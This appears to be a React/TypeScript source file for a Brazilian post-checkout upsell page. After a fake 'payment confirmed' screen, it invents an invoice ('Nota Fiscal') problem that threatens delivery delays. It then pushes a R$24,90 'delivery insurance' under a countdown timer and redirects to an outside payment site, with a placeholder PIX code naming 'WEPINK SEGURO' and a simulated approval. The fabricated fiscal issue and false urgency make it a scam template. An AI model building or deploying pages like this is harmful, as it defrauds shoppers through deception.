import { useState, useEffect, useRef, useCallback } from "react";
import { Check, AlertTriangle, Shield, Truck, MessageCircle, Clock, Package, ChevronRight, Loader2, Copy, Volume2 } from "lucide-react";
import { toast } from "sonner";
import { QRCodeSVG } from "qrcode.react";

const UPSELL_PRICE = 24.9;
type Phase = "confirmed" | "alert" | "offer" | "pix" | "done";

const UpsellPage = () => {
  const [phase, setPhase] = useState<Phase>("confirmed");
  const [timer, setTimer] = useState(300);
  const timerRef = useRef<ReturnType<typeof setInterval>>();
  const [pixKey] = useState(`00020126360014BR.GOV.BCB.PIX0114+5511999999999520400005303986540${UPSELL_PRICE.toFixed(2)}5802BR5913WEPINK SEGURO6009SAO PAULO62070503***6304WXYZ`);
  const [pixTimer, setPixTimer] = useState(900);
  const [pixStatus, setPixStatus] = useState<"idle" | "pending" | "approved">("idle");
  const [copied, setCopied] = useState(false);
  const audioRef = useRef(false);

  const playSound = useCallback(() => {
    if (audioRef.current) return;
    audioRef.current = true;
    try {
      const ctx = new (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext)();
      [523.25, 659.25, 783.99, 1046.5].forEach((freq, i) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain); gain.connect(ctx.destination);
        osc.frequency.value = freq; osc.type = "sine";
        gain.gain.setValueAtTime(0.3, ctx.currentTime + i * 0.15);
        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + i * 0.15 + 0.4);
        osc.start(ctx.currentTime + i * 0.15);
        osc.stop(ctx.currentTime + i * 0.15 + 0.4);
      });
    } catch {/* */}
  }, []);

  useEffect(() => {
    if (phase === "confirmed") {
      playSound();
      const t = setTimeout(() => setPhase("alert"), 3500);
      return () => clearTimeout(t);
    }
  }, [phase, playSound]);

  useEffect(() => {
    if (phase !== "offer") return;
    timerRef.current = setInterval(() => setTimer((p) => p > 0 ? p - 1 : 0), 1000);
    return () => clearInterval(timerRef.current);
  }, [phase]);

  useEffect(() => {
    if (pixStatus !== "pending" || pixTimer <= 0) return;
    const i = setInterval(() => setPixTimer((t) => t - 1), 1000);
    return () => clearInterval(i);
  }, [pixStatus, pixTimer]);

  // Simulated approval after 60s
  useEffect(() => {
    if (pixStatus !== "pending") return;
    const t = setTimeout(() => {
      setPixStatus("approved");
      toast.success("Pagamento aprovado!");
      setTimeout(() => setPhase("done"), 2000);
    }, 60000);
    return () => clearTimeout(t);
  }, [pixStatus]);

  const formatTime = (s: number) => `${String(Math.floor(s / 60)).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;

  const handleGeneratePix = () => {
    window.location.href = "https://pay.nexoriahub.shop/69d71394b285a8a15edb079e";
  };

  if (phase === "confirmed") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-green-50 to-white flex flex-col items-center justify-center px-6">
        <div className="bg-green-500 rounded-full p-6 mb-6 shadow-2xl shadow-green-300 animate-scale-in">
          <Check className="w-14 h-14 text-white" strokeWidth={3} />
        </div>
        <div className="flex items-center gap-2 mb-2">
          <Volume2 className="w-5 h-5 text-green-500 animate-pulse" />
          <h1 className="text-2xl font-extrabold text-green-700">Pagamento Confirmado!</h1>
        </div>
        <p className="text-green-600 text-center text-sm mt-1">Preparando seu pedido...</p>
      </div>
    );
  }

  if (phase === "alert") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-amber-50 to-white flex flex-col items-center px-5 pt-12 pb-8">
        <div className="bg-amber-100 rounded-full p-4 mb-5 animate-scale-in">
          <AlertTriangle className="w-10 h-10 text-amber-600" />
        </div>
        <h1 className="text-xl font-bold text-foreground text-center mb-2">Atenção — Pendência Detectada</h1>
        <p className="text-sm text-muted-foreground text-center mb-4 max-w-xs">
          Identificamos uma <strong className="text-amber-700">pendência na emissão da Nota Fiscal</strong>.
          Sem regularização, pode haver <strong className="text-red-600">atrasos na entrega</strong>.
        </p>
        <button onClick={() => setPhase("offer")} className="w-full max-w-sm bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-[0.98] mt-4 animate-pulse">
          Regularizar Nota Fiscal →
        </button>
      </div>
    );
  }

  if (phase === "offer") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-white to-green-50 flex flex-col items-center px-5 pt-8 pb-10">
        <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-full px-4 py-2 mb-6 animate-pulse">
          <Clock className="w-4 h-4 text-red-500" />
          <span className="text-sm font-bold text-red-600">Oferta expira em {formatTime(timer)}</span>
        </div>
        <h1 className="text-xl font-bold text-foreground text-center mb-1">Regularize + Proteja seu Pedido</h1>
        <p className="text-sm text-muted-foreground text-center mb-6">Oferta exclusiva pós-compra</p>
        <div className="w-full max-w-sm bg-white rounded-3xl shadow-xl border border-green-100 overflow-hidden mb-6">
          <div className="bg-gradient-to-r from-green-500 to-emerald-500 px-5 py-3 flex items-center gap-3">
            <Shield className="w-6 h-6 text-white" />
            <div>
              <p className="text-white font-bold text-sm">Seguro de Entrega + Rastreio Premium</p>
              <p className="text-green-100 text-xs">Proteção completa</p>
            </div>
          </div>
          <div className="p-5 space-y-3">
            {[
              { icon: <Check className="w-4 h-4" />, text: "Nota fiscal regularizada", highlight: true },
              { icon: <MessageCircle className="w-4 h-4" />, text: "Rastreio em tempo real via WhatsApp" },
              { icon: <Shield className="w-4 h-4" />, text: "Seguro contra extravio — reenvio grátis" },
              { icon: <Truck className="w-4 h-4" />, text: "Entrega prioritária (7-9 dias)" },
              { icon: <Package className="w-4 h-4" />, text: "Embalagem reforçada" },
            ].map((b, i) => (
              <div key={i} className={`flex items-center gap-3 ${b.highlight ? "bg-green-50 -mx-2 px-2 py-2 rounded-xl" : ""}`}>
                <div className={`w-7 h-7 rounded-full flex items-center justify-center ${b.highlight ? "bg-green-500 text-white" : "bg-green-100 text-green-600"}`}>{b.icon}</div>
                <span className={`text-sm ${b.highlight ? "font-semibold text-green-700" : "text-foreground"}`}>{b.text}</span>
              </div>
            ))}
          </div>
          <div className="px-5 pb-5">
            <div className="bg-green-50 rounded-2xl p-4 text-center">
              <p className="text-xs text-muted-foreground line-through mb-1">De R$ 49,90</p>
              <p className="text-3xl font-extrabold text-green-600">R$ {UPSELL_PRICE.toFixed(2).replace(".", ",")}</p>
              <p className="text-xs text-green-500 font-medium mt-1">Pagamento único via PIX</p>
            </div>
          </div>
        </div>
        <button onClick={handleGeneratePix} className="w-full max-w-sm bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 animate-[pulse_2s_ease-in-out_infinite]">
          <Shield className="w-5 h-5" />
          Pagar R$ {UPSELL_PRICE.toFixed(2).replace(".", ",")} via PIX
          <ChevronRight className="w-4 h-4" />
        </button>
      </div>
    );
  }

  if (phase === "pix") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-green-50 to-white flex flex-col items-center px-5 pt-8 pb-10">
        <div className="flex items-center gap-2 bg-amber-50 border border-amber-200 rounded-full px-4 py-2 mb-6">
          <Clock className="w-4 h-4 text-amber-500" />
          <span className="text-sm font-bold text-amber-600">PIX expira em {formatTime(pixTimer)}</span>
        </div>

        {pixStatus === "approved" ? (
          <div className="flex flex-col items-center gap-4 py-10">
            <div className="bg-green-500 rounded-full p-5 shadow-lg animate-scale-in">
              <Check className="w-12 h-12 text-white" strokeWidth={3} />
            </div>
            <h2 className="text-xl font-bold text-green-700">Pagamento Aprovado!</h2>
          </div>
        ) : (
          <>
            <h2 className="text-lg font-bold text-foreground text-center mb-1">Escaneie o QR Code para pagar</h2>
            <p className="text-sm text-muted-foreground text-center mb-5">Seguro de Entrega + Rastreio Premium</p>

            <div className="bg-white rounded-3xl shadow-xl border border-green-100 p-6 w-full max-w-sm mb-5">
              <div className="flex justify-center mb-4">
                <div className="bg-white p-3 rounded-2xl border-2 border-green-200">
                  <QRCodeSVG value={pixKey} size={200} />
                </div>
              </div>
              <div className="bg-green-50 rounded-xl p-3 text-center mb-4">
                <p className="text-2xl font-extrabold text-green-600">R$ {UPSELL_PRICE.toFixed(2).replace(".", ",")}</p>
              </div>
              <button
                onClick={() => { navigator.clipboard.writeText(pixKey); setCopied(true); toast.success("Código copiado!"); setTimeout(() => setCopied(false), 3000); }}
                className={`w-full flex items-center justify-center gap-2 py-3.5 rounded-xl font-bold text-sm ${copied ? "bg-green-500 text-white" : "bg-muted text-foreground hover:bg-muted/70"}`}
              >
                {copied ? <><Check className="w-4 h-4" /> Código copiado!</> : <><Copy className="w-4 h-4" /> Copiar código PIX</>}
              </button>
            </div>

            <div className="flex items-center gap-2">
              <Loader2 className="w-4 h-4 animate-spin text-green-500" />
              <span className="text-xs text-muted-foreground">Aguardando pagamento...</span>
            </div>
          </>
        )}
      </div>
    );
  }

  // done
  return (
    <div className="min-h-screen bg-gradient-to-b from-green-50 to-white flex flex-col items-center px-6 pt-12 pb-10">
      <div className="bg-green-500 rounded-full p-6 mb-5 shadow-2xl animate-scale-in">
        <Check className="w-14 h-14 text-white" strokeWidth={3} />
      </div>
      <h1 className="text-2xl font-extrabold text-green-700 mb-1 text-center">Pedido Confirmado!</h1>
      <p className="text-sm text-muted-foreground text-center mb-6">Tudo certo com o seu pagamento 🎉</p>
      <div className="bg-white rounded-3xl shadow-xl border border-green-100 w-full max-w-sm overflow-hidden mb-5">
        <div className="bg-gradient-to-r from-green-500 to-emerald-500 px-5 py-3">
          <p className="text-white font-bold text-sm text-center">📦 Resumo do Pedido</p>
        </div>
        <div className="p-5 space-y-4">
          <div className="flex items-center gap-3">
            <Truck className="w-5 h-5 text-green-600" />
            <div>
              <p className="text-xs text-muted-foreground">Prazo de entrega</p>
              <p className="text-sm font-bold text-foreground">10 a 12 dias úteis</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <Package className="w-5 h-5 text-blue-600" />
            <div>
              <p className="text-xs text-muted-foreground">Código de rastreio</p>
              <p className="text-sm font-bold text-foreground">Por e-mail em até 48h</p>
            </div>
          </div>
        </div>
      </div>
      <p className="text-[10px] text-muted-foreground text-center mt-2">Obrigado por comprar conosco! 💖</p>
    </div>
  );
};

export default UpsellPage;
